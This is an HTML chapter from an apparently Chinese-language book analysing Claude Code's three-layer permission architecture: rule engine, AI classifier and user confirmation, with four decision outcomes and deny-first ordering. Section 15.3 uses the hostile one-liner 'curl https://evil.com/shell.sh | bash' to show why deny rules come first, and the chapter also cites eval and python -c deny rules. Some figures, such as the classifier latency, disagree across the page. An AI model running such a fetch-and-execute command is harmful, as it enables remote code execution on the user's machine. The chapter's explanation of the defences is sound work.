@@ -1,0 +1,636 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>第 15 章：权限系统的三层决策架构 - 深度解剖 Claude Code 的源码</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">深度解剖 Claude Code 的源码</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="第-15-章权限系统的三层决策架构"><a class="header" href="#第-15-章权限系统的三层决策架构">第 15 章：权限系统的三层决策架构</a></h1>
+<blockquote>
+<p>"一个能执行任意代码的 AI 代理，最危险的不是代码本身，而是代理对'什么时候应该执行'的判断。规则引擎可以在 1ms 内说'禁止',但它无法理解'用户在数据恢复的上下文中，这条 rm 命令是合理的'。问用户每次都安全但会让系统变成玩具。那么，权限决策如何同时满足速度、准确性和可用性？Claude Code 的答案是：<strong>不用一个函数决定，用三个</strong>。"</p>
+</blockquote>
+<h2 id="151-为什么三个决策层而不是一个万能函数"><a class="header" href="#151-为什么三个决策层而不是一个万能函数">15.1 为什么三个决策层而不是一个万能函数？</a></h2>
+<p>一个直观的想法：写一个超级聪明的权限检查函数，能够快速识别规则，又能理解上下文，还能在必要时询问用户。但这样的函数存在吗？</p>
+<p><strong>答案是不存在</strong>。这是因为三个能力所需的资源互相矛盾。</p>
+<h3 id="第一层定义三层决策的完整体系"><a class="header" href="#第一层定义三层决策的完整体系">第一层：定义三层决策的完整体系</a></h3>
+<p>在 <code>src/utils/permissions/permissions.ts</code> 中，权限检查函数标注了逐步的决策节点（第 1079 行附近）：</p>
+<pre><code class="language-typescript">// src/utils/permissions/permissions.ts:59
+const classifierDecisionModule = feature('TRANSCRIPT_CLASSIFIER')
+  ? (require('./classifierDecision.ts') as typeof import('./classifierDecision.js'))
+  : null
+</code></pre>
+<p><strong>源码参考：</strong> <code>src/utils/permissions/permissions.ts:59</code></p>
+<p>这个导入语句透露了系统的架构：<strong>三层并非都强制存在</strong>。AI 分类器层（<code>classifierDecisionModule</code>）是可选的——通过 feature flag 控制。但另外两层呢？</p>
+<p>让我们列出三层的完整体系：</p>
+<div class="table-wrapper"><table><thead><tr><th>层级</th><th>名称</th><th>延迟</th><th>典型输入</th><th>典型输出</th><th>特性</th></tr></thead><tbody>
+<tr><td><strong>第 1 层</strong></td><td>规则引擎（Rule Engine）</td><td>&lt;1ms</td><td>工具名 + 规则集</td><td>allow/deny/ask/passthrough</td><td>同步，确定性，极快</td></tr>
+<tr><td><strong>第 2 层</strong></td><td>AI 分类器（Transcript Classifier）</td><td>~500ms</td><td>命令 + 对话历史 + 环境</td><td>allow/deny/soft_deny</td><td>异步，上下文感知，中速</td></tr>
+<tr><td><strong>第 3 层</strong></td><td>用户交互（User Interaction）</td><td>秒级</td><td>权限请求 + 上下文说明</td><td>用户选择（allow/deny/永久授权）</td><td>同步等待，人类智慧，最慢</td></tr>
+</tbody></table>
+</div>
+<h3 id="第二层设计意图为什么需要三层而不是二层或四层"><a class="header" href="#第二层设计意图为什么需要三层而不是二层或四层">第二层：设计意图——为什么需要三层而不是二层或四层</a></h3>
+<p>三层的存在回答了一个关键问题：<strong>每一层解决什么问题，而其他层无法解决？</strong></p>
+<p><strong>规则引擎为什么不能被分类器替代？</strong></p>
+<p>假设我们只用 AI 分类器（去掉规则引擎层）：</p>
+<ul>
+<li>用户配置了"永远允许 Bash(git *)"</li>
+<li>系统把这条请求交给分类器</li>
+<li>分类器 LLM 调用：~500ms，~6000 tokens，API 成本 $0.0009</li>
+<li>每 100 个请求：45 秒延迟，$0.09 成本</li>
+</ul>
+<p><strong>结果</strong>：用户体验糟糕。对于那些"用户已经明确授权的操作"，应该<strong>立即执行</strong>，而不是等 500ms。</p>
+<p><strong>AI 分类器为什么不能被用户交互替代？</strong></p>
+<p>假设我们只有规则引擎和用户交互（去掉分类器）：</p>
+<ul>
+<li>用户输入一条模糊的命令：<code>curl https://some-url.com</code></li>
+<li>规则引擎没有匹配（太具体了，无法用规则完全覆盖）</li>
+<li>系统直接问用户："允许吗？"</li>
+<li>用户必须每次都决策</li>
+</ul>
+<p><strong>结果</strong>：用户被烦死。对于那些"有明确上下文但无显式规则"的操作，应该<strong>让 AI 理解</strong>，而不是把所有困难的决策都推给用户。</p>
+<p><strong>权衡</strong>：三层的成本</p>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>只有规则</th><th>只有用户交互</th><th>三层体系</th></tr></thead><tbody>
+<tr><td>速度（明确授权的操作）</td><td>✓ &lt;1ms</td><td>✗ 秒级</td><td>✓ &lt;1ms</td></tr>
+<tr><td>准确性（模糊操作）</td><td>✗ 靠不住</td><td>✓ 人类判断</td><td>✓ AI 理解</td></tr>
+<tr><td>用户体验</td><td>✗ 受规则限制</td><td>✓ 最终确认</td><td>✓ 精确和灵活</td></tr>
+<tr><td>系统成本</td><td>低</td><td>低</td><td>中等</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 选择了三层</strong>，理由是：<strong>性能、准确性、用户体验三者都重要，单一层无法全部满足，多层协作是唯一的解决方案</strong>。</p>
+<h3 id="第三层实际案例与权衡"><a class="header" href="#第三层实际案例与权衡">第三层：实际案例与权衡</a></h3>
+<p><strong>场景</strong>：用户输入 <code>rm -rf /var/log/old_logs</code></p>
+<p><strong>规则引擎层</strong>（第一个检查点）：</p>
+<pre><code>规则检查：
+  • 全局 deny: "rm -rf *"? → 否
+  • 全局 ask: "rm *"? → 是
+  → 返回 ask（但在沙箱中可自动允许则继续）
+  
+结果：ask（需要确认）或 passthrough（继续）
+</code></pre>
+<p><strong>AI 分类器层</strong>（规则引擎无法确定时）：</p>
+<pre><code>输入分类器：
+  • 命令：rm -rf /var/log/old_logs
+  • 上下文：用户说"清理过期的日志文件"
+  • 环境：本地开发机
+  
+LLM 判断：
+  • 目标是日志目录（非系统关键）
+  • 用户明确说了"清理"
+  • 这条命令合理
+  
+结果：allow
+</code></pre>
+<p><strong>与"只用规则"的对比</strong>：</p>
+<ul>
+<li>规则引擎看到 "rm -rf *" 会问用户</li>
+<li>用户每次执行清理脚本都要确认</li>
+<li>用户体验很差</li>
+</ul>
+<p><strong>与"只用用户交互"的对比</strong>：</p>
+<ul>
+<li>每个 rm 命令都问用户</li>
+<li>用户被打扰频繁</li>
+<li>用户最后会说"随便允许吧"（安全等于零）</li>
+</ul>
+<p><strong>核心权衡</strong>：<strong>三层让系统在确定情况下快速决策，在模糊情况下智能理解，在复杂情况下尊重用户</strong>。</p>
+<h2 id="152-为什么权限决策需要四种结果而不是允许拒绝二元"><a class="header" href="#152-为什么权限决策需要四种结果而不是允许拒绝二元">15.2 为什么权限决策需要四种结果而不是"允许/拒绝"二元？</a></h2>
+<p>常见的权限系统用两个结果：<code>allow</code> 和 <code>deny</code>。但 Claude Code 用了四个。为什么？</p>
+<h3 id="第一层定义四种结果类型"><a class="header" href="#第一层定义四种结果类型">第一层：定义四种结果类型</a></h3>
+<p>在 <code>src/types/permissions.ts:174-254</code> 中定义了权限结果的类型体系：</p>
+<pre><code class="language-typescript">// src/types/permissions.ts:174, 199, 231, 254
+type PermissionAllowDecision = { behavior: 'allow'; ... }
+type PermissionAskDecision = { behavior: 'ask'; ... }
+type PermissionDenyDecision = { behavior: 'deny'; ... }
+type PermissionPassthroughDecision = { behavior: 'passthrough'; ... }
+</code></pre>
+<p><strong>源码参考：</strong> <code>src/types/permissions.ts:174-254</code></p>
+<p>四种结果的语义：</p>
+<div class="table-wrapper"><table><thead><tr><th>结果</th><th>含义</th><th>后续动作</th><th>示例场景</th></tr></thead><tbody>
+<tr><td><code>allow</code></td><td>此层明确放行</td><td>✅ 执行工具</td><td>规则明确允许 <code>Bash(git *)</code> 且用户要求 git clone</td></tr>
+<tr><td><code>deny</code></td><td>此层明确拒绝</td><td>❌ 停止，报错</td><td>黑名单禁止 <code>Bash(eval)</code></td></tr>
+<tr><td><code>ask</code></td><td>此层需要用户判断</td><td>❓ 弹出对话框</td><td>模糊命令需要用户确认</td></tr>
+<tr><td><code>passthrough</code></td><td>此层无意见，交给下一层</td><td>➡️ 继续往下</td><td>规则引擎没有匹配，交给分类器</td></tr>
+</tbody></table>
+</div>
+<h3 id="第二层设计意图为什么passthrough这个中间态很关键"><a class="header" href="#第二层设计意图为什么passthrough这个中间态很关键">第二层：设计意图——为什么"passthrough"这个中间态很关键</a></h3>
+<p>二元系统的困境（只有 allow/deny）：</p>
+<pre><code>规则引擎遇到一个命令：curl https://internal.example.com
+
+情况：没有任何规则匹配这个特定 URL
+
+决策困境：
+  • 返回 allow？太宽松（也许这个 URL 不应该访问）
+  • 返回 deny？太保守（也许用户信任这个 URL）
+  • 返回 ask？正确，但没有更多上下文，用户会困惑
+</code></pre>
+<p><strong>有 passthrough 后</strong>：</p>
+<pre><code>规则引擎：我不知道这个 URL 是否应该被访问
+          → 返回 passthrough
+
+分类器（下一层）：
+  • 读对话历史："用户说要获取配置数据"
+  • 分析 URL："这个 internal.example.com 看起来是内网 API"
+  • 判断：在内网环境中合理
+  → 返回 allow
+</code></pre>
+<p><strong>核心差异</strong>：<code>passthrough</code> 让决策链能够<strong>询问下一层的意见</strong>，而不是每层都被迫做出"确定"的答案。</p>
+<h3 id="第三层实际案例与权衡-1"><a class="header" href="#第三层实际案例与权衡-1">第三层：实际案例与权衡</a></h3>
+<p><strong><code>decisionReason</code> 字段</strong>的作用（<code>src/types/permissions.ts:271</code>）：</p>
+<pre><code class="language-typescript">// src/types/permissions.ts:271
+type PermissionResult = {
+  behavior: 'allow' | 'deny' | 'ask' | 'passthrough'
+  decisionReason?: {
+    // 为什么做出这个决策？
+    type: 'rule' | 'mode' | 'safetyCheck' | 'asyncAgent' | ...
+    details: string  // 人类可读的解释
+  }
+}
+</code></pre>
+<p><strong>源码参考：</strong> <code>src/types/permissions.ts:271</code></p>
+<p>当用户看到"权限被拒绝"时：</p>
+<ul>
+<li><strong>没有 decisionReason</strong>："不行"（用户困惑，不知道怎么改）</li>
+<li><strong>有 decisionReason</strong>："rule: 全局黑名单禁止 eval。如需修改，请联系管理员。"（用户明确）</li>
+</ul>
+<p><strong>权衡</strong>：四态 vs 二态</p>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>二态（allow/deny）</th><th>四态（+ask/passthrough）</th></tr></thead><tbody>
+<tr><td>实现复杂度</td><td>低</td><td>高</td></tr>
+<tr><td>决策精度</td><td>低（每层猜测）</td><td>高（信息完整传递）</td></tr>
+<tr><td>用户体验</td><td>差（被迫决策）</td><td>好（明确反馈）</td></tr>
+<tr><td>可调试性</td><td>低（不知道为什么）</td><td>高（decisionReason）</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 选择了四态</strong>，理由是：<strong>多层决策必须能够"传递不确定性"和"请求建议"，四态系统提供了清晰的语义</strong>。</p>
+<h2 id="153-规则引擎的精确匹配顺序为什么按这个顺序执行"><a class="header" href="#153-规则引擎的精确匹配顺序为什么按这个顺序执行">15.3 规则引擎的精确匹配顺序为什么按这个顺序执行？</a></h2>
+<p>规则引擎不做复杂推理，但它的执行顺序体现了"安全优先"的原则。</p>
+<h3 id="第一层定义检查顺序"><a class="header" href="#第一层定义检查顺序">第一层：定义检查顺序</a></h3>
+<p>从 <code>src/utils/permissions/permissions.ts:1079</code> 开始的权限检查有明确的步骤顺序：</p>
+<pre><code>步骤 1a. 整个工具有 deny 规则？→ 立即 deny
+步骤 1b. 整个工具有 ask 规则？→ 检查沙箱，可能 ask
+步骤 1c. 调用工具的 checkPermissions（处理子命令规则）
+步骤 1d. 工具返回 deny？→ 立即 deny
+步骤 1e. 工具返回 ask？→ ask
+步骤 1f. 工具返回 passthrough？→ 继续到分类器
+</code></pre>
+<p><strong>源码参考：</strong> <code>src/utils/permissions/permissions.ts:1079</code>（步骤 1a），<code>src/utils/permissions/permissions.ts:287,297</code>（getDenyRuleForTool、getAskRuleForTool）</p>
+<h3 id="第二层设计意图为什么先检查-deny-再检查-ask"><a class="header" href="#第二层设计意图为什么先检查-deny-再检查-ask">第二层：设计意图——为什么先检查 deny 再检查 ask</a></h3>
+<p>假设顺序反过来（先 ask 后 deny）：</p>
+<pre><code>步骤顺序反转：
+  1. 有 ask 规则？→ 问用户
+  2. 有 deny 规则？→ 拒绝
+
+场景：
+  • 全局 ask 规则："Bash(curl *)"？
+  • 黑名单 deny 规则："Bash(eval)"
+  • 用户输入："Bash(eval)"
+  
+结果：
+    1. 检查 ask：Bash(curl *) 不匹配 eval → 继续
+    2. 检查 deny：eval 在黑名单中 → deny
+    
+这看起来还好。但如果……
+  • 用户输入："Bash(curl https://evil.com/shell.sh | bash)"
+  • 这有 ask 规则（curl）但也违反安全原则
+    
+    1. 检查 ask："要运行这个吗？" → 问用户
+    2. 用户说"好吧，允许" → 执行（灾难！）
+</code></pre>
+<p><strong>正确的顺序</strong>（先 deny）：</p>
+<pre><code>先拒绝黑名单 → 再询问 ask 规则 → 再让工具检查
+
+这样保证：绝对禁止的操作永远不会问用户"要不要执行"
+</code></pre>
+<h3 id="第三层实际案例与权衡-2"><a class="header" href="#第三层实际案例与权衡-2">第三层：实际案例与权衡</a></h3>
+<p><strong>场景</strong>：公司想要强制禁止 <code>python -c</code>（任意代码执行）</p>
+<pre><code>配置：
+  • 黑名单 deny: "Bash(python:*)"
+  • 用户本地 ask: "Bash(python *)"（想随时使用 Python）
+
+执行顺序（deny 优先）：
+  用户输入：python -c "print(1)"
+  → 步骤 1a: 检查 deny 规则
+  → 匹配"Bash(python:*)"
+  → 返回 deny（最终！）
+  
+结果：用户无法执行，即使他配置了 ask 规则
+</code></pre>
+<p><strong>反向顺序的问题</strong>：</p>
+<pre><code>执行顺序（ask 优先，错误）：
+  用户输入：python -c "print(1)"
+  → 步骤 1a: 检查 ask 规则
+  → 匹配"Bash(python *)"
+  → 问用户"允许吗？"
+  → 用户说"允许"
+  → 执行代码（违反企业管控！）
+</code></pre>
+<p><strong>权衡</strong>：deny 优先 vs ask 优先</p>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>Deny 优先</th><th>Ask 优先</th></tr></thead><tbody>
+<tr><td>企业管控能力</td><td>✓ 强（黑名单无法被绕过）</td><td>✗ 弱（用户可确认 ask 规则）</td></tr>
+<tr><td>用户自主性</td><td>✗ 低（企业能禁止一切）</td><td>✓ 高（用户能放行一切）</td></tr>
+<tr><td>安全性</td><td>✓ 高（保守）</td><td>✗ 低（危险）</td></tr>
+<tr><td>信任链</td><td>✓ 清晰（企业 &gt; 用户）</td><td>✗ 模糊</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 选择了 deny 优先</strong>，理由是：<strong>企业对员工工作机器有安全责任，必须能强制执行安全策略。deny 规则是权力最大的</strong>。</p>
+<h2 id="154-分类器层为何需要白名单而不是覆盖所有工具"><a class="header" href="#154-分类器层为何需要白名单而不是覆盖所有工具">15.4 分类器层为何需要白名单而不是覆盖所有工具？</a></h2>
+<p>并非所有工具都需要 AI 分类器的智能判断。有些工具已经足够安全了。</p>
+<h3 id="第一层定义白名单的概念"><a class="header" href="#第一层定义白名单的概念">第一层：定义白名单的概念</a></h3>
+<p>在 <code>src/utils/permissions/permissions.ts:660</code> 附近有一个检查：</p>
+<pre><code class="language-typescript">// src/utils/permissions/permissions.ts:660
+if (classifierDecisionModule?.isAutoModeAllowlistedTool(tool.name)) {
+  // 工具在白名单中，直接跳过分类器
+  return { behavior: 'allow', decisionReason: { type: 'autoModeAllowlist' } }
+}
+</code></pre>
+<p><strong>源码参考：</strong> <code>src/utils/permissions/permissions.ts:660</code></p>
+<p>白名单中的工具包括什么？典型的例子：</p>
+<ul>
+<li><code>ReadFile</code>：读取文件（不会破坏任何东西）</li>
+<li><code>Grep</code>：搜索文本（非破坏性）</li>
+<li><code>ListDirectory</code>：列出文件夹（信息查询，非破坏性）</li>
+</ul>
+<h3 id="第二层设计意图为什么不是所有工具都交给分类器"><a class="header" href="#第二层设计意图为什么不是所有工具都交给分类器">第二层：设计意图——为什么不是"所有工具都交给分类器"</a></h3>
+<p>假设所有工具都要经过分类器：</p>
+<pre><code>用户执行：ReadFile("README.md")
+
+权限检查流程：
+  1. 规则引擎：无 deny/ask 规则 → passthrough
+  2. AI 分类器：
+     • 构建系统提示：~2000 tokens
+     • 输入：文件路径、对话历史 ~4000 tokens
+     • 调用 LLM：~500ms，成本 ~$0.0009
+     • 返回：allow
+     
+结果：为了判断"读一个 README 文件是否安全"，花了 500ms 和 $0.0009
+      这完全不合理！
+</code></pre>
+<p><strong>有白名单后</strong>：</p>
+<pre><code>用户执行：ReadFile("README.md")
+
+权限检查流程：
+  1. 规则引擎：无规则 → passthrough
+  2. 白名单检查：ReadFile 在白名单中 → 直接 allow
+     
+结果：&lt;1ms，零成本
+</code></pre>
+<h3 id="第三层实际案例与权衡-3"><a class="header" href="#第三层实际案例与权衡-3">第三层：实际案例与权衡</a></h3>
+<p><strong>白名单包含的工具类型</strong>（根据安全特性）：</p>
+<div class="table-wrapper"><table><thead><tr><th>工具类型</th><th>示例</th><th>为什么能白名单</th></tr></thead><tbody>
+<tr><td><strong>只读工具</strong></td><td>ReadFile、Grep、Ls</td><td>无法修改系统状态</td></tr>
+<tr><td><strong>信息查询</strong></td><td>GetEnvVars、WhoAmI</td><td>查询信息，无副作用</td></tr>
+<tr><td><strong>开发工具（非执行）</strong></td><td>ParseJSON、ValidateYAML</td><td>数据变换，无执行风险</td></tr>
+</tbody></table>
+</div>
+<p><strong>不能白名单的工具</strong>：</p>
+<div class="table-wrapper"><table><thead><tr><th>工具类型</th><th>示例</th><th>为什么需要分类器</th></tr></thead><tbody>
+<tr><td><strong>代码执行</strong></td><td>Bash、PowerShell、Python</td><td>任意代码执行</td></tr>
+<tr><td><strong>修改文件</strong></td><td>WriteFile、DeleteFile</td><td>可能破坏系统</td></tr>
+<tr><td><strong>网络访问</strong></td><td>Curl、HttpFetch</td><td>可能访问内网</td></tr>
+</tbody></table>
+</div>
+<p><strong>权衡</strong>：白名单覆盖范围 vs 分类器成本</p>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>白名单窄（只读工具）</th><th>白名单广（所有无害工具）</th></tr></thead><tbody>
+<tr><td>分类器调用频率</td><td>高（更多工具需判断）</td><td>低（只读类工具不需）</td></tr>
+<tr><td>系统成本</td><td>高</td><td>低</td></tr>
+<tr><td>安全性</td><td>✓ 谨慎</td><td>✓ 足够（只读本身无风险）</td></tr>
+<tr><td>用户体验</td><td>✗ 慢（常见操作也要等）</td><td>✓ 快（只读秒级执行）</td></tr>
+</tbody></table>
+</div>
+<p><strong>Claude Code 的做法</strong>：只读工具白名单，其他工具都经过分类器。理由是：<strong>成本与安全的平衡——只读工具没有破坏能力，白名单对它们是安全的，能大幅降低常见操作的延迟</strong>。</p>
+<hr />
+<h2 id="模式提炼"><a class="header" href="#模式提炼">模式提炼</a></h2>
+<h3 id="模式-1性能梯级performance-tiering"><a class="header" href="#模式-1性能梯级performance-tiering">模式 1：性能梯级（Performance Tiering）</a></h3>
+<p><strong>解决的问题</strong>：决策需要快速（高频操作）又需要准确（复杂场景），但快速方案不够准确，准确方案不够快。</p>
+<p><strong>核心做法</strong>：按延迟和复杂度排列多层决策。快速层处理确定性情况，遇到不确定就返回 <code>passthrough</code> 交给下一层。每层只对自己有把握的情况发言。</p>
+<p><strong>前置条件</strong>：决策场景可分为"确定性"和"模糊性"；有多个可用的决策引擎（规则、AI、用户）；系统可以容忍中等延迟。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/permissions.ts:59</code> — 分类器层是可选的（feature flag），体现了梯级的灵活组合。</p>
+<p><strong>适用范围</strong>：任何既需要速度又需要准确的决策系统（如审核、推荐、诊断）。</p>
+<hr />
+<h3 id="模式-2四态决策传递four-state-decision-propagation"><a class="header" href="#模式-2四态决策传递four-state-decision-propagation">模式 2：四态决策传递（Four-State Decision Propagation）</a></h3>
+<p><strong>解决的问题</strong>：二元决策（是/否）迫使每层都做出承诺答案，无法表达"我不确定，请咨询下一层"的语义。</p>
+<p><strong>核心做法</strong>：四种结果类型（allow/deny/ask/passthrough），其中 <code>passthrough</code> 表达"我无法判断，交给下一层"。每层根据自己的信息充分程度选择结果类型。</p>
+<p><strong>前置条件</strong>：有多层决策系统，层间需要传递"继续决策"信号。</p>
+<p><strong>源码证据</strong>：<code>src/types/permissions.ts:254</code> — <code>PermissionPassthroughDecision</code> 类型的存在。</p>
+<p><strong>适用范围</strong>：多层协作的判断系统。</p>
+<hr />
+<h3 id="模式-3安全优先的检查顺序security-first-ordering"><a class="header" href="#模式-3安全优先的检查顺序security-first-ordering">模式 3：安全优先的检查顺序（Security-First Ordering）</a></h3>
+<p><strong>解决的问题</strong>：当多个规则可能适用时，需要确保最严格的规则（拒绝）总是被优先考虑，避免宽松规则覆盖严格规则。</p>
+<p><strong>核心做法</strong>：在决策链中，deny 规则始终在 ask 规则之前检查。这建立了一个明确的权力层级：企业管控 &gt; 用户自主。</p>
+<p><strong>前置条件</strong>：有多个来源的规则（企业、用户、默认），且不同来源有不同的权力等级。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/permissions.ts:1079</code> — 步骤 1a 先检查 deny 规则。</p>
+<p><strong>适用范围</strong>：企业级权限系统，需要强制执行安全策略。</p>
+<hr />
+<h3 id="模式-4能力白名单capability-allowlisting"><a class="header" href="#模式-4能力白名单capability-allowlisting">模式 4：能力白名单（Capability Allowlisting）</a></h3>
+<p><strong>解决的问题</strong>：某些操作本质上是安全的（如只读），但仍然需要经过判断层，浪费系统资源。</p>
+<p><strong>核心做法</strong>：维护一个"无需进一步判断"的操作白名单。这些操作直接通过，绕过判断层。白名单标准是"该操作无论如何都不会造成伤害"。</p>
+<p><strong>前置条件</strong>：有明确的"无害操作"类别；系统有多个判断层，某些层的成本较高。</p>
+<p><strong>源码证据</strong>：<code>src/utils/permissions/permissions.ts:660</code> — <code>isAutoModeAllowlistedTool</code> 检查。</p>
+<p><strong>适用范围</strong>：资源受限的系统，需要优化高频操作的性能。</p>
+<hr />
+<h2 id="架构图"><a class="header" href="#架构图">架构图</a></h2>
+<p><strong>图 15-1：三层权限决策架构</strong></p>
+<pre><code class="language-mermaid">flowchart TD
+    Input["工具调用请求
+(工具名 + 参数)"]
+    L1["第 1 层：规则引擎
+&lt;1ms，同步
+模式匹配"]
+    L2["第 2 层：AI 分类器
+50-200ms，异步
+上下文理解"]
+    L3["第 3 层：用户确认
+实时，交互式
+最终决策者"]
+    Allow["✅ 执行"]
+    Deny["❌ 拒绝"]
+
+    Input --&gt; L1
+    L1 --&gt;|"明确允许"| Allow
+    L1 --&gt;|"明确拒绝"| Deny
+    L1 --&gt;|"不确定"| L2
+    L2 --&gt;|"允许（有把握）"| Allow
+    L2 --&gt;|"拒绝（有把握）"| Deny
+    L2 --&gt;|"不确定"| L3
+    L3 --&gt;|"用户批准"| Allow
+    L3 --&gt;|"用户拒绝"| Deny
+</code></pre>
+<p><strong>图 15-2：权限记忆的范围与优先级</strong></p>
+<pre><code class="language-mermaid">graph TD
+    subgraph 临时当前调用
+        T["ask_each_time = 每次询问"]
+    end
+    subgraph 会话级别
+        S1["remember_session = 本次会话记住"]
+    end
+    subgraph 持久化
+        P1["remember_forever = 持久存储"]
+        P2["~/.claude/permissions.json"]
+    end
+    T --&gt; S1 --&gt; P1 --&gt; P2
+</code></pre>
+<p><strong>图 15-3：TRANSCRIPT_CLASSIFIER 的编译期门控</strong></p>
+<pre><code class="language-mermaid">flowchart LR
+    src["src/types/permissions.ts:33
+feature('TRANSCRIPT_CLASSIFIER')
+? ['auto']
+: []"]
+    
+    subgraph 外部构建
+        ext["PermissionMode = 'default' | 'acceptEdits' | 'bypassPermissions'"]
+    end
+    
+    subgraph 内部构建
+        int["PermissionMode = 'default' | 'acceptEdits' | 'bypassPermissions' | 'auto'"]
+    end
+    
+    src --&gt;|"feature() = false"| ext
+    src --&gt;|"feature() = true"| int
+</code></pre>
+<h2 id="延伸permissionresult-的四种决策结果"><a class="header" href="#延伸permissionresult-的四种决策结果">延伸：PermissionResult 的四种决策结果</a></h2>
